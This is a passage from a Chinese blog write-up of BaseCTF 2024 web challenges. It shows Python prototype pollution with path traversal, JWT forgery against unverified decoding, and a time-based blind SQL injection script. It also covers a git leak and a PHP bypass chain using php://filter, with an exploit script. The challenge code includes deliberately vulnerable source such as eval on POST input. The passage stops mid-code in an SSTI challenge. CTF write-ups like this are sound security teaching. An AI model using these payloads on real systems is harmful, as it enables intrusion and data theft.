class="line">Host: challenge.basectf.fun:32916</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;__file__&quot;: &quot;../../../../../../flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="No-JWT"><a href="#No-JWT" class="headerlink" title="No JWT"></a>No JWT</h2><h3 id="题目描述-19"><a href="#题目描述-19" class="headerlink" title="题目描述"></a>题目描述</h3><p>​没有 JWT!</p><h3 id="考点-19"><a href="#考点-19" class="headerlink" title="考点"></a>考点</h3><ul><li>JWT伪造</li></ul><h3 id="题解-19"><a href="#题解-19" class="headerlink" title="题解"></a>题解</h3><p>​下载附件获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成 secret_key</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他用户都给予 user 权限</span></span><br><span class="line">    token = jwt.encode(&#123;</span><br><span class="line">            <span class="string">&#x27;sub&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>,  <span class="comment"># 普通用户角色</span></span><br><span class="line">            <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)</span><br><span class="line">        &#125;, app.secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = jwt.decode(token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;verify_exp&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">            <span class="comment"># 检查用户角色是否为 admin</span></span><br><span class="line">            <span class="keyword">if</span> decoded.get(<span class="string">&#x27;role&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    flag_content = f.read()</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;flag&#x27;</span>: flag_content&#125;), <span class="number">200</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access denied: admin only&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Flag file not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token has expired&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid token&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token is missing&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>​发现作为admin用户登录即可获得flag</p><p>​注意到第35行的<code>decoded = jwt.decode(token.split(&quot; &quot;)[1], options=&#123;&quot;verify_signature&quot;: False, &quot;verify_exp&quot;: False&#125;)</code>，发现对jwt是直接进行解码而未进行验证的</p><p>​先向<code>login</code>路由发送登录信息获取一个token</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.eyJzdWIiOiJCUiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzI3NTA5NTk1fQ.<span class="number">7</span>oH1uZKH7D0PZGl-zuzkfNG4LJS2q-KhjEEWtWNHUo0</span><br></pre></td></tr></table></figure><p>​Header解码后为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​Payload解码后为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BR&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1727509595</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​需要修改role为admin，而由于在解码过程中，未对jwt的加密进行验证，这就意味着直接修改即可</p><p>​修改并base64编码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiJCUiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNzUwOTU5NX0</span><br></pre></td></tr></table></figure><p>​得到伪造的admin的token</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.eyJzdWIiOiJCUiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNzUwOTU5NX0.<span class="number">7</span>oH1uZKH7D0PZGl-zuzkfNG4LJS2q-KhjEEWtWNHUo0</span><br></pre></td></tr></table></figure><p>​访问&#x2F;flag并在请求头添加</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization:<span class="selector-tag">a</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="selector-class">.eyJzdWIiOiJCUiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNzUwOTU5NX0</span>.<span class="number">7</span>oH1uZKH7D0PZGl-zuzkfNG4LJS2q-KhjEEWtWNHUo0</span><br></pre></td></tr></table></figure><p>​ps: a和token之间有个空格不能省，原因是35行的<code>token.split(&quot; &quot;)[1]</code></p><h2 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h2><h3 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h3><p>​只可以一句哦</p><h3 id="考点-20"><a href="#考点-20" class="headerlink" title="考点"></a>考点</h3><ul><li>sql时间盲注</li></ul><h3 id="题解-20"><a href="#题解-20" class="headerlink" title="题解"></a>题解</h3><p>​题目给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有sql注入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你知道的，不可能有RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in ctf.flag</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;没有select，让你执行一句又如何&#x27;;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>​发现禁止了select，同时提示我们flag位于ctf库下的flag表中</p><p>​传入<code>?sql=show columns from flag</code>即可查询表中字段为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field<span class="keyword">Type</span><span class="keyword">Null</span>Key<span class="keyword">Default</span>Extra</span><br><span class="line">id<span class="type">varchar</span>(<span class="number">300</span>)YES<span class="keyword">NULL</span></span><br><span class="line">data<span class="type">varchar</span>(<span class="number">300</span>)YES<span class="keyword">NULL</span></span><br></pre></td></tr></table></figure><p>​推测flag在data字段中</p><p>​使用<code>delete from flag where data like &#39;f%&#39; and sleep(5)</code>进行判断，如果like匹配到了，则会执行sleep，而由于sleep始终返回的是null，where始终为假，则不会真的执行delete操作</p><p>​由此写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SQL</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.chr_list = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&#123;&#125;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.url = <span class="string">&quot;http://challenge.basectf.fun:33096/&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.timeout = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">blind_injection_by_get_and_chr</span>(<span class="params">self</span>):</span><br><span class="line">        flag = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> <span class="variable language_">self</span>.chr_list:</span><br><span class="line">                payload = <span class="string">f&quot;?sql=delete from flag where BINARY data like &#x27;<span class="subst">&#123;flag+<span class="built_in">chr</span>&#125;</span>%&#x27; and sleep(5)&quot;</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    requests.get(<span class="variable language_">self</span>.url + payload, timeout=<span class="variable language_">self</span>.timeout)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    flag += <span class="built_in">chr</span></span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">attack = SQL()</span><br><span class="line">attack.blind_injection_by_get_and_chr()</span><br></pre></td></tr></table></figure><p>​官方WP给出的脚本没有区分大小写，最好在payload中添加BINARY进行大小写区分</p><p>​等待一会即可获得flag</p><h1 id="Fin"><a href="#Fin" class="headerlink" title="Fin"></a>Fin</h1><h2 id="Back-to-the-future"><a href="#Back-to-the-future" class="headerlink" title="Back to the future"></a>Back to the future</h2><h3 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h3><p>​本题理论不需要扫描器</p><h3 id="考点-21"><a href="#考点-21" class="headerlink" title="考点"></a>考点</h3><ul><li>git信息泄露</li></ul><h3 id="题解-21"><a href="#题解-21" class="headerlink" title="题解"></a>题解</h3><p>​开局只有几个字，没有其他线索，需要信息搜集，既然说到理论不需要扫描器，尝试访问<code>/robots.txt</code>，发现<code>Disallow: /.git</code></p><p>​存在git信息泄露</p><p>​使用GitHacker进行扫描利用</p><p>​发现了README.md</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># My Website</span></span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> <span class="keyword">my</span> web project.</span><br><span class="line"></span><br><span class="line">Oops, I place flag here, <span class="keyword">but</span> i deleted <span class="keyword">it</span>!</span><br></pre></td></tr></table></figure><p>​提示的很明显，应该是要查git日志找历史记录</p><p>​进入到<code>.git</code>所在目录，使用<code>git log</code>命令</p><p>​看到<img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_fin_web_backtothefuture_0.png" alt="basectf2024_fin_web_backtothefuture_0"></p><p>​使用<code>git log -p e2bc04bc70f7b7476ae7ad0e943ef62aa2b5556e</code>即可看到flag</p><p><img src="/../post_img/633096d238827efa349111abeadee67d/basectf2024_fin_web_backtothefuture_1.png" alt="basectf2024_fin_web_backtothefuture_1"></p><h2 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h2><h3 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h3><p>​php没有难题（Kengwang和晨曦出的除外）</p><h3 id="考点-22"><a href="#考点-22" class="headerlink" title="考点"></a>考点</h3><ul><li>php解析特性</li><li>常见php函数绕过</li><li>php原生类</li><li>php伪协议</li><li>魔术方法</li></ul><h3 id="题解-22"><a href="#题解-22" class="headerlink" title="题解"></a>题解</h3><p>​题目给出源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我记得她...好像叫flag.php吧？</span></span><br><span class="line"><span class="variable">$emp</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;e_m.p&#x27;</span>];</span><br><span class="line"><span class="variable">$try</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;try&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$emp</span>!=<span class="string">&quot;114514&quot;</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$emp</span>,<span class="number">0</span>)===<span class="number">114514</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$emp</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$emp</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="variable">$try</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">stripos</span>(<span class="variable">$try</span>,<span class="string">&#x27;HACKER&#x27;</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$b</span>,<span class="string">&#x27;php&#x27;</span>)!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>))-&gt;<span class="variable">$c</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 觉得困难的话就直接把shell拿去用吧，不用谢~</span></span><br><span class="line"><span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​首先分析题目要求，经典绕过+套娃类体型</p><p>​需要满足以下条件才能执行<code>eval()</code>:</p><ol><li><p><code>$emp!=&quot;114514&quot;</code></p></li><li><p><code>intval($emp,0)===114514</code></p></li><li><p><code>$emp</code>中不存在字母</p></li><li><p><code>preg_match(&#39;/.+?HACKER/is&#39;,$try)</code>匹配失败</p></li><li><p><code>stripos($try,&#39;HACKER&#39;)===True</code></p></li><li><p><code>stripos($b,&#39;php&#39;)===0</code></p><p>对于<code>$emp=$_GET[&#39;e_m.p&#39;];</code>，倘若直接传<code>?e_m.p=114514</code>，则php服务器实际上会将其解析为<code>?e_m_p=114514</code>，而在php版本&lt;8的环境中，存在一个解析bug，即传入<code>?e[m.p=114514</code>使php将<code>[</code>解析为<code>_</code>，而后面的<code>.</code>不会再被转义解析。</p><p>传入<code>?e[m.p=114514a</code>，显然<code>$emp!=&quot;114514&quot;</code>，而<code>intval()</code>会将114514a转化成整型114514，完成条件一二。</p><p>然后被条件三拦下，处理方法很简单，把a换成一个非特殊字符即可，例如<code>?e[m.p=114514\</code>。</p><p>对于条件四和五，无法采用数组绕过，想到绕过preg_match的方法还有回溯次数绕过，默认回溯100w次，再100w个字符后的将不会继续匹配，手写自然不限，需要用到脚本辅助，使用python，POST传<code>&#123;try: &quot;a&quot;*1000001 + &quot;HACKER&quot;&#125;</code>。</p><p>对于条件六，传<code>?b=php</code>即可。</p><p>然后注意到<code>echo (new $a($b))-&gt;$c();</code>，很明显，需要用到php原生类，使用<code>SplFileObject</code>类访问文件，</p><p>恰好<code>$b</code>以php开头，可以使用php伪协议进行文件包含<code>b=php://filter/convert.base64-encode/resource=flag.php</code>，</p><p>最后，实例化这个原生类并调用了其一个名为<code>$C</code>的方法，原生类中自然存在魔术方法，而要输出字符串，最好的自然是<code>__toString</code>魔术方法，传<code>?c=__toString</code>。</p><p>最终，exp为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:41761/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?e[m.p=114514\\&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;a=SplFileObject&amp;c=__toString&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;try&quot;</span>: <span class="string">&quot;-&quot;</span>*<span class="number">1000001</span>+<span class="string">&quot;HACKER&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url+payload, data=data).text</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><p>最后代码虽然给到了shell，但如果前面没有构建成功，代码是无法运行到eval函数处的，要么报错，要么就die了</p></li></ol><h2 id="Jinja-Mark"><a href="#Jinja-Mark" class="headerlink" title="Jinja Mark"></a>Jinja Mark</h2><h3 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h3><p>​ssti注入只会用带花括号的payload？逊诶</p><h3 id="考点-23"><a href="#考点-23" class="headerlink" title="考点"></a>考点</h3><ul><li>原型链污染</li><li>SSTI模板注入</li></ul><h3 id="题解-23"><a href="#题解-23" class="headerlink" title="题解"></a>题解</h3><p>​访问根路由，提示：<code>都进题了，愣着干嘛，去/index里啊！什么？你想要flag，那你去/flag啊！</code>得知还有<code>/index</code>和<code>/flag</code>路由</p><p>​访问<code>/flag</code>路由，提示：<code>你不会以为这里真的有flag吧？想要flag的话先猜猜我的幸运数字，用POST方式把 lucky_number 告诉我吧，只有四位数哦</code></p><p>​访问<code>/index</code>路由并尝试ssti注入，提示：<code>Hello 别急着ssti注入嘛，先去/magic那里给我变个魔术</code>，得知还有<code>/magic</code>路由</p><p>​访问<code>/magic</code>则提示：<code>记得用POST方法把魔术交上来</code></p><p>​选择先从<code>/flag</code>路由下手，直接上BurpSuite暴力跑幸运数字，爆破得到幸运数字为5346，并得到部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">def <span class="title function_ invoke__">merge</span>(src, dst):</span><br><span class="line">    <span class="keyword">for</span> k, v in src.<span class="title function_ invoke__">items</span>():</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.<span class="title function_ invoke__">get</span>(k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">                <span class="title function_ invoke__">merge</span>(v, dst.<span class="title function_ invoke__">get</span>(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif <span class="title function_ invoke__">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="title function_ invoke__">type</span>(v) == dict:</span><br><span class="line">            <span class="title function_ invoke__">merge</span>(v, <span class="title function_ invoke__">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="title function_ invoke__">setattr</span>(dst, k, v)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/magic&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span 